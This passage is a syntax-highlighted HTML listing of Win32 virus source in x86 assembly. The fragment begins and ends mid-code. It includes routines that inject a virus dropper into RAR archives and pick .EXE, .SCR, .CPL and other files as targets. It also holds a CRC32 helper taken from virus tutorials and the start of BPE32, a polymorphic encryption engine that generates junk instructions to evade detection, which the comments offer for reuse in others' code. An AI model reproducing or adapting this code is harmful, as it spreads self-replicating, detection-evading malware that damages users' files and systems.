        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">                              </span><span class="sc1">;calculate CRC32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RARCRC32</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;save it</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RARHeaderCRC</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;start of RAR header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">end_RAR</span><span class="sc4">-</span><span class="sc5">RARHeader</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">;size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">                              </span><span class="sc1">;calculate CRC32 of header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RARHeaderCRC</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;save it</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">end_RAR</span><span class="sc4">-</span><span class="sc5">RARHeader</span><span class="sc0">              </span><span class="sc1">;size of RAR header</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RARHeader</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;start of RAR header</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_something</span><span class="sc0">                    </span><span class="sc1">;write RAR header to file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3000h</span><span class="sc0">                          </span><span class="sc1">;dropper size</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">virus_in_arc</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;start of dropper</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_something</span><span class="sc0">                    </span><span class="sc1">;write dropper to file</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                          </span><span class="sc1">;and close file</span><span class="sc0">


</span><span class="sc5">c_name</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;save EDI</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">targetname</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">sgdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;address of filename</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cname</span><span class="sc0">                                                    
</span><span class="sc5">check_name</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;save EDI</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">targetname</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;address of filename</span><span class="sc0">
</span><span class="sc5">cname</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                            </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">                       </span><span class="sc1">;size of filename</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">n_loop</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">;load byte</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0">                             </span><span class="sc1">;is it BIG letter?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">nlower</span><span class="sc0">                               </span><span class="sc1">;yeah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'z'</span><span class="sc0">                             </span><span class="sc1">;is it letter?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">nlower</span><span class="sc0">                               </span><span class="sc1">;no</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc12">'a'</span><span class="sc0">                         </span><span class="sc1">;upper letter</span><span class="sc0">
</span><span class="sc5">nlower</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">;save letter</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                             </span><span class="sc1">;is it end?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">e_name</span><span class="sc0">                               </span><span class="sc1">;yeah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'\'                             ;is it backslash
</span><span class="sc0">        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">nloop</span><span class="sc0">                               </span><span class="sc1">;no</span><span class="sc0">
</span><span class="sc5">nloop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">n_loop</span><span class="sc0">                             </span><span class="sc1">;upper letters in loop</span><span class="sc0">
</span><span class="sc5">i_name</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">;restore EDI</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                                     </span><span class="sc1">;set error flag</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;and return</span><span class="sc0">
</span><span class="sc5">e_name</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;get extension</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">                         </span><span class="sc1">;is it .EXE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">n_name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'RCS.'</span><span class="sc0">                         </span><span class="sc1">;is it .SCR</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">n_name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'RAR.'</span><span class="sc0">                         </span><span class="sc1">;is it .RAR</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">n_name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'XFS.'</span><span class="sc0">                         </span><span class="sc1">;is it .SFX</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">n_name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'LPC.'</span><span class="sc0">                         </span><span class="sc1">;is it .CPL</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">n_name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'KAB.'</span><span class="sc0">                         </span><span class="sc1">;is it .BAK</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">n_name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'TAD.'</span><span class="sc0">                         </span><span class="sc1">;is it .DAT</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">i_name</span><span class="sc0">                               
</span><span class="sc5">n_name</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">;restore EDI</span><span class="sc0">
</span><span class="sc5">callback</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                                     </span><span class="sc1">;clear error flag</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;and return</span><span class="sc0">

</span><span class="sc5">seek_here</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;seek to EAX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;ECX=EAX</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                             </span><span class="sc1">;CX=MSW of EAX</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">;DX=LSW of EAX</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;EAX=0</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">seek</span><span class="sc0">                                </span><span class="sc1">;seek</span><span class="sc0">
</span><span class="sc5">seek_eof</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">                             </span><span class="sc1">;AL=2h</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">                                     </span><span class="sc1">;EDX=0</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;ECX=0</span><span class="sc0">
</span><span class="sc5">seek</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">                             </span><span class="sc1">;AH=42h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                             </span><span class="sc1">;seek</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">q_seek</span><span class="sc0">                               </span><span class="sc1">;error?</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">;EAX=LSW of EAX</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;EAX=LSW of EAX &amp; MSW of EDX</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">                                     </span><span class="sc1">;EDX=0</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                                     </span><span class="sc1">;clear error flag</span><span class="sc0">
</span><span class="sc5">q_seek</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;return</span><span class="sc0">

</span><span class="sc5">CRC32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;I found this code in Int13h's</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;tutorial about infectin'</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;archives. Int13h found this</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;code in Vecna's Inca virus.</span><span class="sc0">
</span><span class="sc5">NextByteCRC</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;So, thank ya guys...</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;Ehrm, this is very fast</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">;procedure to code CRC32 at</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">;runtime, no need to use big</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                              </span><span class="sc1">;tables.</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">NextBitCRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">NoCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08320h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0edb8h</span><span class="sc0">
</span><span class="sc5">NoCRC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NextBitCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NextByteCRC</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;BPE32 (Benny's Polymorphic Engine for Win32) starts here. U can find first</span><span class="sc0">
</span><span class="sc1">;version of BPE32 in DDT#1 e-zine. But unfortunately, how it usualy goes,</span><span class="sc0">
</span><span class="sc1">;there were TWO, REALLY SILLY/TINY bugs. I found them and corrected them. So,</span><span class="sc0">
</span><span class="sc1">;if u wanna use BPE32 in your code, use this version, not that version from</span><span class="sc0">
</span><span class="sc1">;DDT#1. Very BIG sorry to everyone, who had/has/will have problems with it.</span><span class="sc0">

</span><span class="sc5">BPE32</span><span class="sc0">   </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;save all regs</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;save these regs for l8r use</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;preserve this reg</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">              </span><span class="sc1">;generate random junk instructions</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;restore it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">                </span><span class="sc1">;create CALL instruction</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;calculate size of CALL+junx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;save it</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;get random number</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">             </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">xor_key</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">;use it as xor constant</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;get random number</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">             </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">key_inc</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">;use it as key increment constant</span><span class="sc0">
</span><span class="sc5">x_loop</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;load DWORD</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;encrypt it</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;store encrypted DWORD</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;increment key</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">x_loop</span><span class="sc0">             </span><span class="sc1">;next DWORD</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">              </span><span class="sc1">;generate junx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0006e860h</span><span class="sc0">          </span><span class="sc1">;generate SEH handler</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">648b0000h</span><span class="sc0">          </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ceb0824h</span><span class="sc0">          </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">

</span><span class="sc5">greg0</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_reg</span><span class="sc0">                </span><span class="sc1">;get random register</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">               </span><span class="sc1">;MUST NOT be EBP register</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">greg0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;store register</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">              </span><span class="sc1">;proc parameter (do not generate MOV)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor</span><span class="sc0">               </span><span class="sc1">;create XOR or SUB instruction</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;destroy parameter</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64h</span><span class="sc0">             </span><span class="sc1">;generate FS:</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">896430ffh</span><span class="sc0">          </span><span class="sc1">;next SEH instructions</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">               </span><span class="sc1">;change register</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;store them</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">             </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">              </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">

